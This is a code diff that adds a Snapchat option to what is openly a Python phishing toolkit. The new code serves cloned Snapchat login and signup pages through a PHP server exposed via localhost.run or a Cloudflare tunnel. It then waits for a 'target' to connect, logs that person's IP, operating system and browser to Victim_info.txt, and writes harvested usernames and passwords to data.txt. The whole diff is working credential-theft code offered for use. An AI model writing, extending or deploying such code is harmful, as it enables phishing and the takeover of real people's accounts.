@@ -2029,7 +2029,415 @@ def Telegram():
         open("info.json" , "w").close()
         sys.exit()
         
+#option 11 ====================================================================================================
+def Snapchat():
+    global port
+    
+    try:
+        print(f"""\n\r{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Snapchat login page\n
+{Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Snapchat Signup page""" + Fore.RESET)
+
+        snap = int(input(Fore.MAGENTA + "\nChoose Snapchat page : " + Fore.RESET))
         
+        if snap > 2:
+            exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid number ! Must be 1 or 2""")
+            
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except EOFError:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except ValueError:
+        exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Number !""")
+        
+    
+    if snap == 1:
+        path = os.getcwd()
+        os.chdir(rf"{path}/Snapchat/snapchat_login")
+    
+    
+#====================================================================================================
+        try:
+            print(f"""\n\r{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
+    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+
+            link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
+            
+            if link > 2:
+                exit(f"""{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid number ! Must be 1 or 2""")
+                
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        except EOFError:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        except ValueError:
+            exit(f"""{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Number !""")
+            
+    #====================================================================================================
+        try:
+            port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
+            if port > 65535:
+                exit(f"""{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
+
+        
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        except EOFError:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+        except ValueError:
+            exit(f"""{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
+    #Run Localhost====================================================================================================
+        php_server()
+        
+        sleep(1)
+        
+    #Run Localhost.run====================================================================================================
+
+        if link == 1:
+            
+            loaclhost()
+            
+            try:
+                print(" ")
+                rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+            except KeyboardInterrupt:
+                exit(f"""\n{Fore.YELLOW}│
+        ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+                
+            print("                          " , end="\r")
+    #Generate Link====================================================================================================
+
+            line = linecache.getline(r"localhost.txt" , 24)
+            print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+            sleep(0.1)
+            linecache.clearcache()
+            
+            Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+            
+    #Run Cloudflare====================================================================================================  
+        if link == 2:
+            
+            cloudfalre()
+            
+            try:
+                print(" ")
+                rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+            except KeyboardInterrupt:
+                exit(f"""\n{Fore.YELLOW}│
+        ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+                
+            print("                          " , end="\r")
+            
+    #Generate Link====================================================================================================
+            line = linecache.getline(r"localhost.txt" , 5)
+            
+            line = line.split()
+            
+            print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
+            
+            sleep(0.1)
+            linecache.clearcache()
+            
+            Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
+    #Write info====================================================================================================
+        try:
+            while True:
+                size = os.stat("info.json")
+                if size.st_size != 0:
+
+                    
+                    with open("info.json", "r") as read_file:
+                        data = json.load(read_file)
+
+                        print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                        print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
+                        print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                        
+                        sleep(0.3)
+                        print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
+                        
+                        sleep(1)
+                        df = pd.read_json(r"info.json")
+                        sleep(1)
+                        df.to_csv("Victim_info.txt", index=False , mode="a")
+
+                        victim_file= open("Victim_info.txt", "a")
+                        victim_file.write("\n")
+                        sleep(3)
+                        open("info.json" , "w").close()
+                        victim_file.close()
+
+                        
+                        Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
+                        break
+
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+    #write username====================================================================================================
+        try:
+            while True:
+                size = os.stat("username_key.txt")
+                if size.st_size != 0:
+                    with open("username_key.txt" , "r") as user:
+                        sleep(10)
+                        print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
+
+                        #clear username.txt file
+                        username =open("username_key.txt")  
+                        data = open("data.txt","a")
+                        for x in username.readlines():
+                            data.write(f"\nThe Username is : {x}")
+                        sleep(1.5)
+                        open("username_key.txt" , "w").close()
+                        
+                        break
+    #write password====================================================================================================
+
+            while True:
+                size = os.stat("password_key.txt")
+                if size.st_size != 0:
+                    with open("password_key.txt" , "r") as pas:
+                        sleep(15)
+                        print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+
+                        #clear password.txt
+                        pwd =open("password_key.txt")  
+                        data = open("data.txt","a")
+                        for x in pwd.readlines():
+                            data.write(f"\nThe Password is : {x}")
+                            data.write("\n")
+                        data.close()
+                        sleep(1.5)
+                        open("password_key.txt" , "w").close()
+                        
+                        sleep(0.5)
+                        print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
+
+                        break
+        except KeyboardInterrupt:
+                exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    #kill php proccess and exit====================================================================================================
+
+        if os.name == "nt":
+            subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+            sleep(2)
+            open("info.json" , "w").close()
+            sys.exit()
+        else:
+            subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
+            sleep(2)
+            open("info.json" , "w").close()
+            sys.exit()
+
+
+#SnapChat signup ====================================================================================================
+    elif snap == 2:
+        
+        path = os.getcwd()
+        os.chdir(rf"{path}/Snapchat/snapchat_signup")
+                  
+#====================================================================================================
+        try:
+            print(f"""\n\r{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
+    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+
+            link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
+            
+            if link > 2:
+                exit(f"""{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid number ! Must be 1 or 2""")
+                
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        except EOFError:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        except ValueError:
+            exit(f"""{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Number !""")
+            
+    #====================================================================================================
+        try:
+            port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
+            if port > 65535:
+                exit(f"""{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
+
+        
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        except EOFError:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+        except ValueError:
+            exit(f"""{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
+    #Run Localhost====================================================================================================
+        php_server()
+        
+        sleep(1)
+        
+    #Run Localhost.run====================================================================================================
+
+        if link == 1:
+            
+            loaclhost()
+            
+            try:
+                print(" ")
+                rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+            except KeyboardInterrupt:
+                exit(f"""\n{Fore.YELLOW}│
+        ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+                
+            print("                          " , end="\r")
+    #Generate Link====================================================================================================
+
+            line = linecache.getline(r"localhost.txt" , 24)
+            print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+            sleep(0.1)
+            linecache.clearcache()
+            
+            Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+            
+    #Run Cloudflare====================================================================================================  
+        if link == 2:
+            
+            cloudfalre()
+            
+            try:
+                print(" ")
+                rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+            except KeyboardInterrupt:
+                exit(f"""\n{Fore.YELLOW}│
+        ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+                
+            print("                          " , end="\r")
+            
+    #Generate Link====================================================================================================
+            line = linecache.getline(r"localhost.txt" , 5)
+            
+            line = line.split()
+            
+            print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
+            
+            sleep(0.1)
+            linecache.clearcache()
+            
+            Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
+    #Write info====================================================================================================
+        try:
+            while True:
+                size = os.stat("info.json")
+                if size.st_size != 0:
+
+                    
+                    with open("info.json", "r") as read_file:
+                        data = json.load(read_file)
+
+                        print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                        print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
+                        print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                        
+                        sleep(0.3)
+                        print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
+                        
+                        sleep(1)
+                        df = pd.read_json(r"info.json")
+                        sleep(1)
+                        df.to_csv("Victim_info.txt", index=False , mode="a")
+
+                        victim_file= open("Victim_info.txt", "a")
+                        victim_file.write("\n")
+                        sleep(3)
+                        open("info.json" , "w").close()
+                        victim_file.close()
+
+                        
+                        Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
+                        break
+
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+    #write username====================================================================================================
+        try:
+            while True:
+                size = os.stat("username_key.txt")
+                if size.st_size != 0:
+                    with open("username_key.txt" , "r") as user:
+                        sleep(10)
+                        print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
+
+                        #clear username.txt file
+                        username =open("username_key.txt")  
+                        data = open("data.txt","a")
+                        for x in username.readlines():
+                            data.write(f"\nThe Username is : {x}")
+                        sleep(1.5)
+                        open("username_key.txt" , "w").close()
+                        
+                        break
+    #write password====================================================================================================
+
+            while True:
+                size = os.stat("password_key.txt")
+                if size.st_size != 0:
+                    with open("password_key.txt" , "r") as pas:
+                        sleep(15)
+                        print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+
+                        #clear password.txt
+                        pwd =open("password_key.txt")  
+                        data = open("data.txt","a")
+                        for x in pwd.readlines():
+                            data.write(f"\nThe Password is : {x}")
+                            data.write("\n")
+                        data.close()
+                        sleep(1.5)
+                        open("password_key.txt" , "w").close()
+                        
+                        sleep(0.5)
+                        print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
+
+                        break
+        except KeyboardInterrupt:
+                exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    #kill php proccess and exit====================================================================================================
+
+        if os.name == "nt":
+            subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+            sleep(2)
+            open("info.json" , "w").close()
+            sys.exit()
+        else:
+            subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
+            sleep(2)
+            open("info.json" , "w").close()
+            sys.exit()
+
 #Run functions ====================================================================================================
 if ask == "0":
     zero_exit()
